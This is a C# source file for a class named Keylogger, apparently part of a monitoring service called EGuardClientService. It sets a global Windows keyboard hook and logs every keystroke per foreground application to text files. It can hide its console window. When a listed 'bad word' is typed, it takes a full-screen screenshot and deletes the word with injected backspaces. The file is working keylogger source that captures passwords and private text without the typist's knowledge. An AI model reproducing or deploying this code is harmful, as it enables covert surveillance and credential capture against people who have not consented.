using EGuardClientService.Framework;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Drawing;

namespace EGuardClientService
{
    class Keylogger
    {
        //set to 0 to hide, 1 for basic debug info, 2 for verbose debugging
        private const int DEBUG_LEVEL = 2;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0101;
        private static LowLevelKeyboardProc lowlevelkeyboardproc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        //private static char[] keylogBuffer = new char[15];
        private static String keylogBuffer = "012345678901234567889";
        private static List<string> badWordList;


        public Keylogger() 
        {
            var handle = GetConsoleWindow();
            buildWordList();
            // Hide
            if (DEBUG_LEVEL == 0)
            {
                ShowWindow(handle, 0);
            }
            _hookID = SetHook(lowlevelkeyboardproc);
            
        }

        ~Keylogger()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private static void buildWordList()
        {
            System.Console.WriteLine("BAD_WORD_LIST.txt must exist in same folder as the .exe");
            string[] lines = System.IO.File.ReadAllLines(Application.StartupPath + @"\BAD_WORD_LIST.txt");
            badWordList = new List<string>();

            // Display the file contents by using a foreach loop.
            System.Console.WriteLine("Contents of BAD_WORD_LIST.txt = ");
            foreach (string line in lines)
            {
                if (String.IsNullOrEmpty(line) == false)
                {
                    badWordList.Add(line.ToUpper());
                    Console.WriteLine("\t" + line);
                }
            }
        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                String activeWindowName = "";
                bool applicationFound = false;
                Process[] processCollection = Process.GetProcesses();
                if (processCollection != null && processCollection.Length >= 1 && processCollection[0] != null)
                {
                    IntPtr activeWindowHandle = GetForegroundWindow();
                    foreach (Process wordProcess in processCollection)
                    {
                        if (wordProcess.MainWindowHandle == activeWindowHandle)
                        {
                            //Console.WriteLine("Active Widnow: " + wordProcess.ProcessName);
                            applicationFound = true;
                            activeWindowName = wordProcess.ProcessName;
                            break;
                        }
                    }
                }

                if (applicationFound == true)
                {
                    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                    {
                        int vkCode = Marshal.ReadInt32(lParam);

                        Keys inKey = (Keys)vkCode;

                        StreamWriter logStream = new StreamWriter(Application.StartupPath + @"\" + activeWindowName + "_log.txt", true);

                        writeFile(logStream, inKey);
                        logStream.Close();
                        if (DEBUG_LEVEL >= 2)
                        {
                            Console.WriteLine(inKey.ToString());
                        }

                        if (inKey == Keys.Back)
                        {
                            keylogBuffer = keylogBuffer.Substring(0, keylogBuffer.Length - 1);
                        }


                        foreach (String badWord in badWordList)
                        {
                            if (keylogBuffer.Contains(badWord))
                            {
                                Console.WriteLine("BAD WORD '" + badWord + "' DETECTED!");
                                keylogBuffer = "012345678901234567889";
                                takeScreenshot(activeWindowName);

                                for (int i = 0; i < badWord.Length; i++)
                                {
                                    SendKeys.Send("{BACKSPACE}");
                                }

                            }
                        }

                        if (inKey == Keys.Home)
                        {
                            takeScreenshot(activeWindowName);
                        }
                    }
                }

            }
            catch (InvalidCastException e)
            {
                Console.ReadLine();

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        //takes screenshot and saves to temperary file
        private static void takeScreenshot(String activeWindowName)
        {
            Bitmap bmpScreenShot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(bmpScreenShot);
            g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bmpScreenShot.Size, CopyPixelOperation.SourceCopy);
            bmpScreenShot.Save(Application.StartupPath + @"\" + activeWindowName + ".gif", System.Drawing.Imaging.ImageFormat.Gif);
        }

        //Writes characters and numbers to file
        private static void writeFile(StreamWriter logStream, Keys inKey)
        {
            if (isChar(inKey))
            {
                keylogBuffer = keylogBuffer.Substring(1) + inKey.ToString();
                logStream.Write(inKey);
            }
            else if (inKey == Keys.D0 || inKey == Keys.NumPad0)
                logStream.Write("0");
            else if (inKey == Keys.D1 || inKey == Keys.NumPad1)
                logStream.Write("1");
            else if (inKey == Keys.D2 || inKey == Keys.NumPad2)
                logStream.Write("2");
            else if (inKey == Keys.D3 || inKey == Keys.NumPad3)
                logStream.Write("3");
            else if (inKey == Keys.D4 || inKey == Keys.NumPad4)
                logStream.Write("4");
            else if (inKey == Keys.D5 || inKey == Keys.NumPad5)
                logStream.Write("5");
            else if (inKey == Keys.D6 || inKey == Keys.NumPad6)
                logStream.Write("6");
            else if (inKey == Keys.D7 || inKey == Keys.NumPad7)
                logStream.Write("7");
            else if (inKey == Keys.D8 || inKey == Keys.NumPad8)
                logStream.Write("8");
            else if (inKey == Keys.D9 || inKey == Keys.NumPad9)
                logStream.Write("9");
            else if (inKey == Keys.OemPeriod)
                logStream.Write(".");
            else if (inKey == Keys.Space)
            {
                keylogBuffer = keylogBuffer.Substring(1) + ' ';
                logStream.Write(" ");
            }
            else if (inKey == Keys.Enter)
            {
                logStream.WriteLine("");
            }

        }

        //returns true if key pressed is a character
        private static bool isChar(Keys key)
        {
            if (key == Keys.A)
                return true;
            if (key == Keys.B)
                return true;
            if (key == Keys.C)
                return true;
            if (key == Keys.D)
                return true;
            if (key == Keys.E)
                return true;
            if (key == Keys.F)
                return true;
            if (key == Keys.G)
                return true;
            if (key == Keys.H)
                return true;
            if (key == Keys.I)
                return true;
            if (key == Keys.J)
                return true;
            if (key == Keys.K)
                return true;
            if (key == Keys.L)
                return true;
            if (key == Keys.M)
                return true;
            if (key == Keys.N)
                return true;
            if (key == Keys.O)
                return true;
            if (key == Keys.P)
                return true;
            if (key == Keys.Q)
                return true;
            if (key == Keys.R)
                return true;
            if (key == Keys.S)
                return true;
            if (key == Keys.T)
                return true;
            if (key == Keys.U)
                return true;
            if (key == Keys.V)
                return true;
            if (key == Keys.W)
                return true;
            if (key == Keys.X)
                return true;
            if (key == Keys.Y)
                return true;
            if (key == Keys.Z)
                return true;
            return false;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }

}
